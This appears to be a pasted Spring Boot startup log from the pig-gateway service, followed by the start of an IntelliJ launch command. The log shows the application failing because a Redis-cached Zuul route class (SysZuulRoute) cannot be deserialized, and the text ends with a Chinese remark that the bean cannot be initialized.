Detector 10-10 09:15:21.063 INFO [o.s.cloud.netflix.eureka.InstanceInfoFactory] - Setting initial instance status as: STARTING 10-10 09:15:21.153 INFO [com.netflix.discovery.DiscoveryClient] - Initializing Eureka in region us-east-1 10-10 09:15:21.325 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using JSON encoding codec LegacyJacksonJson 10-10 09:15:21.325 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using JSON decoding codec LegacyJacksonJson 10-10 09:15:21.401 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using XML encoding codec XStreamXml 10-10 09:15:21.402 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using XML decoding codec XStreamXml 10-10 09:15:21.549 INFO [c.n.d.shared.resolver.aws.ConfigClusterResolver] - Resolving eureka endpoints via configuration 10-10 09:15:21.561 INFO [com.netflix.discovery.DiscoveryClient] - Disable delta property : false 10-10 09:15:21.562 INFO [com.netflix.discovery.DiscoveryClient] - Single vip registry refresh property : null 10-10 09:15:21.562 INFO [com.netflix.discovery.DiscoveryClient] - Force full registry fetch : false 10-10 09:15:21.562 INFO [com.netflix.discovery.DiscoveryClient] - Application is null : false 10-10 09:15:21.562 INFO [com.netflix.discovery.DiscoveryClient] - Registered Applications size is zero : true 10-10 09:15:21.562 INFO [com.netflix.discovery.DiscoveryClient] - Application version is -1: true 10-10 09:15:21.562 INFO [com.netflix.discovery.DiscoveryClient] - Getting all instance registry info from the eureka server 10-10 09:15:21.689 INFO [com.netflix.discovery.DiscoveryClient] - The response status is 200 10-10 09:15:21.691 INFO [com.netflix.discovery.DiscoveryClient] - Not registering with Eureka server per configuration 10-10 09:15:21.694 INFO [com.netflix.discovery.DiscoveryClient] - Discovery Client initialized at timestamp 1539134121693 with initial instances count: 2 . ____ _ __ _ _ /\ / <em><em><em>'</em> __ _ <em>(</em>)</em> __ __ _ \ \ \ ( ( )_</em>_ | '_ | '<em>| | '</em> / <em>` | \ \ \ \/ <em><em><em>)| |</em>)| | | | | || (</em>| | ) ) ) ) ' |</em></em><em><em>| .__|</em>| |</em>|<em>| |</em>_<em>, | / / / / =========|</em>|==============|<em><em><em>/=/</em>/</em>/</em>/ :: Spring Boot :: (v1.5.15.RELEASE) 10-10 09:15:21.885 INFO [o.s.c.c.client.ConfigServicePropertySourceLocator] - Fetching config from server at: http://192.168.3.163:4001/ 10-10 09:15:22.369 INFO [o.s.c.c.client.ConfigServicePropertySourceLocator] - Located environment: name=pig-gateway, profiles=[dev], label=dev, version=a20a5326177dbe7e42dc8c74f0e05793307fdce7, state=null 10-10 09:15:22.370 INFO [o.s.c.b.c.PropertySourceBootstrapConfiguration] - Located property source: CompositePropertySource [name='configService', propertySources=[MapPropertySource {name='configClient'}, MapPropertySource {name='https://gitee.com/untilgo/pig-config/pig-gateway-dev.yml'}, MapPropertySource {name='https://gitee.com/untilgo/pig-config/application-dev.yml'}]] 10-10 09:15:22.402 INFO [c.u.j.c.EnableEncryptablePropertiesConfiguration] - Bootstraping jasypt-string-boot auto configuration in context: pig-gateway:dev:9999 10-10 09:15:22.402 INFO [com.github.pig.gateway.PigGatewayApplication] - The following profiles are active: dev 10-10 09:15:22.414 INFO [o.s.b.c.e.AnnotationConfigEmbeddedWebApplicationContext] - Refreshing org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext@6088451e: startup date [Wed Oct 10 09:15:22 CST 2018]; parent: org.springframework.context.annotation.AnnotationConfigApplicationContext@e25951c 10-10 09:15:23.160 INFO [o.s.integration.config.IntegrationRegistrar] - No bean named 'integrationHeaderChannelRegistry' has been explicitly defined. Therefore, a default DefaultHeaderChannelRegistry will be created. 10-10 09:15:23.237 INFO [o.s.d.r.config.RepositoryConfigurationDelegate] - Multiple Spring Data modules found, entering strict repository configuration mode! 10-10 09:15:23.367 INFO [o.s.b.factory.support.DefaultListableBeanFactory] - Overriding bean definition for bean 'counterFactory' with a different definition: replacing [Root bean: class [null]; scope=; abstract=false; lazyInit=false; autowireMode=3; dependencyCheck=0; autowireCandidate=true; primary=false; factoryBeanName=org.springframework.cloud.netflix.zuul.ZuulServerAutoConfiguration$ZuulMetricsConfiguration; factoryMethodName=counterFactory; initMethodName=null; destroyMethodName=(inferred); defined in class path resource [org/springframework/cloud/netflix/zuul/ZuulServerAutoConfiguration$ZuulMetricsConfiguration.class]] with [Root bean: class [null]; scope=; abstract=false; lazyInit=false; autowireMode=3; dependencyCheck=0; autowireCandidate=true; primary=false; factoryBeanName=org.springframework.cloud.netflix.zuul.ZuulServerAutoConfiguration$ZuulCounterFactoryConfiguration; factoryMethodName=counterFactory; initMethodName=null; destroyMethodName=(inferred); defined in class path resource [org/springframework/cloud/netflix/zuul/ZuulServerAutoConfiguration$ZuulCounterFactoryConfiguration.class]] 10-10 09:15:23.601 INFO [o.springframework.cloud.context.scope.GenericScope] - BeanFactory id=10f9021a-3b5e-3bed-a14f-06c45599682e 10-10 09:15:23.618 INFO [c.u.j.c.EnableEncryptablePropertiesBeanFactoryPostProcessor] - Post-processing PropertySource instances 10-10 09:15:23.632 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource bootstrapProperties [org.springframework.core.env.CompositePropertySource] to EncryptableEnumerablePropertySourceWrapper 10-10 09:15:23.632 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource servletConfigInitParams [org.springframework.core.env.PropertySource$StubPropertySource] to EncryptablePropertySourceWrapper 10-10 09:15:23.632 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource servletContextInitParams [org.springframework.core.env.PropertySource$StubPropertySource] to EncryptablePropertySourceWrapper 10-10 09:15:23.633 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource systemProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:23.633 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource systemEnvironment [org.springframework.core.env.SystemEnvironmentPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:23.633 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource random [org.springframework.boot.context.config.RandomValuePropertySource] to EncryptablePropertySourceWrapper 10-10 09:15:23.633 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource springCloudClientHostInfo [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:23.633 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource defaultProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:23.641 INFO [o.s.i.c.DefaultConfiguringBeanFactoryPostProcessor] - No bean named 'errorChannel' has been explicitly defined. Therefore, a default PublishSubscribeChannel will be created. 10-10 09:15:23.644 INFO [o.s.i.c.DefaultConfiguringBeanFactoryPostProcessor] - No bean named 'taskScheduler' has been explicitly defined. Therefore, a default ThreadPoolTaskScheduler will be created. 10-10 09:15:23.654 INFO [o.s.b.f.a.AutowiredAnnotationBeanPostProcessor] - JSR-330 'javax.inject.Inject' annotation found and supported for autowiring 10-10 09:15:23.675 INFO [c.u.j.resolver.DefaultLazyPropertyResolver] - Property Resolver custom Bean not found with name 'encryptablePropertyResolver'. Initializing Default Property Resolver 10-10 09:15:23.675 INFO [c.u.j.detector.DefaultLazyPropertyDetector] - Property Detector custom Bean not found with name 'encryptablePropertyDetector'. Initializing Default Property Detector 10-10 09:15:23.688 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.amqp.rabbit.annotation.RabbitBootstrapConfiguration' of type [org.springframework.amqp.rabbit.annotation.RabbitBootstrapConfiguration$$EnhancerBySpringCGLIB$$62332455] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:23.871 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration' of type [org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration$$EnhancerBySpringCGLIB$$34752e61] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:23.884 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'objectPostProcessor' of type [org.springframework.security.config.annotation.configuration.AutowireBeanFactoryObjectPostProcessor] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:23.891 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@1adfb5b8' of type [org.springframework.security.oauth2.provider.expression.OAuth2MethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:23.905 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration' of type [org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration$$EnhancerBySpringCGLIB$$5949d113] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:23.922 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:23.933 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'redisCacheConfig' of type [com.github.pig.common.bean.config.RedisCacheConfig$$EnhancerBySpringCGLIB$$ac8c38c8] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:23.996 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'spelConverter' of type [org.springframework.cloud.stream.config.SpelExpressionConverterConfiguration$SpelConverter] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:24.004 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'security.oauth2.client-org.springframework.boot.autoconfigure.security.oauth2.OAuth2ClientProperties' of type [org.springframework.boot.autoconfigure.security.oauth2.OAuth2ClientProperties] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:24.008 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration' of type [org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration$$EnhancerBySpringCGLIB$$53112227] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:24.027 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'resourceServerProperties' of type [org.springframework.boot.autoconfigure.security.oauth2.resource.ResourceServerProperties] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:24.049 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'integrationGlobalProperties' of type [org.springframework.beans.factory.config.PropertiesFactoryBean] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:24.055 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'integrationGlobalProperties' of type [java.util.Properties] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:24.112 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration' of type [org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$b7e16924] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:24.441 INFO [o.s.b.c.e.tomcat.TomcatEmbeddedServletContainer] - Tomcat initialized with port(s): 9999 (http) 10-10 09:15:24.449 INFO [org.apache.coyote.http11.Http11NioProtocol] - Initializing ProtocolHandler [""http-nio-9999""] 10-10 09:15:24.455 INFO [org.apache.catalina.core.StandardService] - Starting service [Tomcat] 10-10 09:15:24.455 INFO [org.apache.catalina.core.StandardEngine] - Starting Servlet Engine: Apache Tomcat/8.5.32 10-10 09:15:24.534 INFO [o.a.c.core.ContainerBase.[Tomcat].[localhost].[/]] - Initializing Spring embedded WebApplicationContext 10-10 09:15:24.535 INFO [org.springframework.web.context.ContextLoader] - Root WebApplicationContext: initialization completed in 2121 ms 10-10 09:15:25.666 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'metricsFilter' to: [/<em>] 10-10 09:15:25.667 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'characterEncodingFilter' to: [/</em>] 10-10 09:15:25.667 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'traceFilter' to: [/<em>] 10-10 09:15:25.667 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'hiddenHttpMethodFilter' to: [/</em>] 10-10 09:15:25.667 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'httpPutFormContentFilter' to: [/<em>] 10-10 09:15:25.667 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'requestContextFilter' to: [/</em>] 10-10 09:15:25.668 INFO [o.s.b.w.s.DelegatingFilterProxyRegistrationBean] - Mapping filter: 'springSecurityFilterChain' to: [/<em>] 10-10 09:15:25.668 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'webRequestLoggingFilter' to: [/</em>] 10-10 09:15:25.668 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'xssSecurityFilter' to: [/<em>] 10-10 09:15:25.668 INFO [o.s.boot.web.servlet.FilterRegistrationBean] - Mapping filter: 'applicationContextIdFilter' to: [/</em>] 10-10 09:15:25.669 INFO [o.s.boot.web.servlet.ServletRegistrationBean] - Mapping servlet: 'dispatcherServlet' to [/] 10-10 09:15:25.695 INFO [o.s.boot.web.servlet.ServletRegistrationBean] - Mapping servlet: 'zuulServlet' to [/zuul/*] 10-10 09:15:26.297 INFO [o.s.c.a.AnnotationConfigApplicationContext] - Refreshing org.springframework.context.annotation.AnnotationConfigApplicationContext@24482a4f: startup date [Wed Oct 10 09:15:26 CST 2018]; parent: org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext@6088451e 10-10 09:15:26.309 INFO [o.s.b.f.a.AutowiredAnnotationBeanPostProcessor] - JSR-330 'javax.inject.Inject' annotation found and supported for autowiring 10-10 09:15:26.981 INFO [o.s.cloud.netflix.eureka.InstanceInfoFactory] - Setting initial instance status as: STARTING 10-10 09:15:26.985 INFO [com.netflix.discovery.DiscoveryClient] - Initializing Eureka in region us-east-1 10-10 09:15:26.988 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using JSON encoding codec LegacyJacksonJson 10-10 09:15:26.989 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using JSON decoding codec LegacyJacksonJson 10-10 09:15:26.989 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using XML encoding codec XStreamXml 10-10 09:15:26.989 INFO [c.n.discovery.provider.DiscoveryJerseyProvider] - Using XML decoding codec XStreamXml 10-10 09:15:27.043 INFO [c.n.d.shared.resolver.aws.ConfigClusterResolver] - Resolving eureka endpoints via configuration 10-10 09:15:27.044 INFO [com.netflix.discovery.DiscoveryClient] - Disable delta property : false 10-10 09:15:27.044 INFO [com.netflix.discovery.DiscoveryClient] - Single vip registry refresh property : null 10-10 09:15:27.044 INFO [com.netflix.discovery.DiscoveryClient] - Force full registry fetch : false 10-10 09:15:27.045 INFO [com.netflix.discovery.DiscoveryClient] - Application is null : false 10-10 09:15:27.045 INFO [com.netflix.discovery.DiscoveryClient] - Registered Applications size is zero : true 10-10 09:15:27.045 INFO [com.netflix.discovery.DiscoveryClient] - Application version is -1: true 10-10 09:15:27.045 INFO [com.netflix.discovery.DiscoveryClient] - Getting all instance registry info from the eureka server 10-10 09:15:27.052 INFO [com.netflix.discovery.DiscoveryClient] - The response status is 200 10-10 09:15:27.053 INFO [com.netflix.discovery.DiscoveryClient] - Starting heartbeat executor: renew interval is: 5 10-10 09:15:27.054 INFO [com.netflix.discovery.InstanceInfoReplicator] - InstanceInfoReplicator onDemand update allowed rate per min is 4 10-10 09:15:27.055 INFO [com.netflix.discovery.DiscoveryClient] - Discovery Client initialized at timestamp 1539134127055 with initial instances count: 2 10-10 09:15:27.112 WARN [o.s.b.c.e.AnnotationConfigEmbeddedWebApplicationContext] - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'permissionService': Unsatisfied dependency expressed through field 'menuService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.github.pig.gateway.feign.MenuService': FactoryBean threw exception on object creation; nested exception is org.springframework.data.redis.serializer.SerializationException: Cannot deserialize; nested exception is org.springframework.core.serializer.support.SerializationFailedException: Failed to deserialize payload. Is the byte array a result of corresponding serialization for DefaultDeserializer?; nested exception is org.springframework.core.NestedIOException: Failed to deserialize object type; nested exception is java.lang.ClassNotFoundException: com.zhidianfan.pig.common.entity.SysZuulRoute 10-10 09:15:27.211 INFO [com.netflix.discovery.DiscoveryClient] - Shutting down DiscoveryClient ... 10-10 09:15:27.217 INFO [o.s.cloud.netflix.eureka.InstanceInfoFactory] - Setting initial instance status as: STARTING 10-10 09:15:27.218 INFO [com.netflix.discovery.DiscoveryClient] - Unregistering ... 10-10 09:15:27.226 INFO [com.netflix.discovery.DiscoveryClient] - DiscoveryClient_PIG-GATEWAY/192.168.3.163:pig-gateway:9999 - deregister status: 404 10-10 09:15:27.231 INFO [com.netflix.discovery.DiscoveryClient] - Completed shut down of DiscoveryClient 10-10 09:15:27.232 INFO [org.apache.catalina.core.StandardService] - Stopping service [Tomcat] 10-10 09:15:27.246 INFO [o.s.b.a.l.AutoConfigurationReportLoggingInitializer] - Error starting ApplicationContext. To display the auto-configuration report re-run your application with 'debug' enabled. 10-10 09:15:27.251 ERROR [org.springframework.boot.SpringApplication] - Application startup failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'permissionService': Unsatisfied dependency expressed through field 'menuService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.github.pig.gateway.feign.MenuService': FactoryBean threw exception on object creation; nested exception is org.springframework.data.redis.serializer.SerializationException: Cannot deserialize; nested exception is org.springframework.core.serializer.support.SerializationFailedException: Failed to deserialize payload. Is the byte array a result of corresponding serialization for DefaultDeserializer?; nested exception is org.springframework.core.NestedIOException: Failed to deserialize object type; nested exception is java.lang.ClassNotFoundException: com.zhidianfan.pig.common.entity.SysZuulRoute at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:588) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1272) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:312) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:308) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:867) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:543) at org.springframework.boot.context.embedded.EmbeddedWebApplicationContext.refresh(EmbeddedWebApplicationContext.java:122) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:693) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:360) at org.springframework.boot.SpringApplication.run(SpringApplication.java:303) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1118) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1107) at com.github.pig.gateway.PigGatewayApplication.main(PigGatewayApplication.java:42) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.github.pig.gateway.feign.MenuService': FactoryBean threw exception on object creation; nested exception is org.springframework.data.redis.serializer.SerializationException: Cannot deserialize; nested exception is org.springframework.core.serializer.support.SerializationFailedException: Failed to deserialize payload. Is the byte array a result of corresponding serialization for DefaultDeserializer?; nested exception is org.springframework.core.NestedIOException: Failed to deserialize object type; nested exception is java.lang.ClassNotFoundException: com.zhidianfan.pig.common.entity.SysZuulRoute at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:185) at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.getObjectFromFactoryBean(FactoryBeanRegistrySupport.java:103) at org.springframework.beans.factory.support.AbstractBeanFactory.getObjectForBeanInstance(AbstractBeanFactory.java:1640) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:254) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1316) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1282) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1101) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:585) ... 19 common frames omitted Caused by: org.springframework.data.redis.serializer.SerializationException: Cannot deserialize; nested exception is org.springframework.core.serializer.support.SerializationFailedException: Failed to deserialize payload. Is the byte array a result of corresponding serialization for DefaultDeserializer?; nested exception is org.springframework.core.NestedIOException: Failed to deserialize object type; nested exception is java.lang.ClassNotFoundException: com.zhidianfan.pig.common.entity.SysZuulRoute at org.springframework.data.redis.serializer.JdkSerializationRedisSerializer.deserialize(JdkSerializationRedisSerializer.java:82) at org.springframework.data.redis.core.AbstractOperations.deserializeValue(AbstractOperations.java:318) at org.springframework.data.redis.core.AbstractOperations$ValueDeserializingRedisCallback.doInRedis(AbstractOperations.java:58) at org.springframework.data.redis.core.RedisTemplate.execute(RedisTemplate.java:207) at org.springframework.data.redis.core.RedisTemplate.execute(RedisTemplate.java:169) at org.springframework.data.redis.core.AbstractOperations.execute(AbstractOperations.java:91) at org.springframework.data.redis.core.DefaultValueOperations.get(DefaultValueOperations.java:43) at com.github.pig.gateway.component.config.DynamicRouteLocator.locateRoutesFromDb(DynamicRouteLocator.java:94) at com.github.pig.gateway.component.config.DynamicRouteLocator.locateRoutes(DynamicRouteLocator.java:68) at com.github.pig.gateway.component.config.DynamicRouteLocator.locateRoutes(DynamicRouteLocator.java:41) at org.springframework.cloud.netflix.zuul.filters.SimpleRouteLocator.doRefresh(SimpleRouteLocator.java:170) at org.springframework.cloud.netflix.zuul.filters.discovery.DiscoveryClientRouteLocator.refresh(DiscoveryClientRouteLocator.java:166) at org.springframework.cloud.netflix.zuul.filters.CompositeRouteLocator.refresh(CompositeRouteLocator.java:75) at org.springframework.cloud.netflix.zuul.web.ZuulHandlerMapping.setDirty(ZuulHandlerMapping.java:78) at org.springframework.cloud.netflix.zuul.ZuulServerAutoConfiguration$ZuulRefreshListener.onApplicationEvent(ZuulServerAutoConfiguration.java:242) at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:393) at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:399) at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:347) at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:883) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:546) at org.springframework.cloud.context.named.NamedContextFactory.createContext(NamedContextFactory.java:116) at org.springframework.cloud.context.named.NamedContextFactory.getContext(NamedContextFactory.java:85) at org.springframework.cloud.context.named.NamedContextFactory.getInstance(NamedContextFactory.java:121) at org.springframework.cloud.sleuth.instrument.web.client.feign.TraceFeignContext.getInstance(TraceFeignContext.java:29) at org.springframework.cloud.netflix.feign.FeignClientFactoryBean.get(FeignClientFactoryBean.java:193) at org.springfra   <code>: 无法初始化bean /Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/bin/java -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=58356 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=127.0.0.1 -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true ""-javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=58357:/Applications/IntelliJ IDEA.app/Contents/bin"" -Dfile.encoding=UTF-8 -classpath /Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/cldrdata.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/jaccess.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/nashorn.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/jfxswt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/jre/lib/rt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/lib/ant-javafx.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/lib/dt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/lib/javafx-mx.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/lib/jconsole.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/lib/packager.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/lib/sa-jdi.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_161.jdk/Contents/Home/lib/tools.jar:/Users/ljh/IdeaProjects/pig/pig-gateway/target/classes:/Users/ljh/IdeaProjects/pig/pig-common/target/classes:/Users/ljh/.m2/repository/io/jsonwebtoken/jjwt/0.9.0/jjwt-0.9.0.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-data-redis/1.5.15.RELEASE/spring-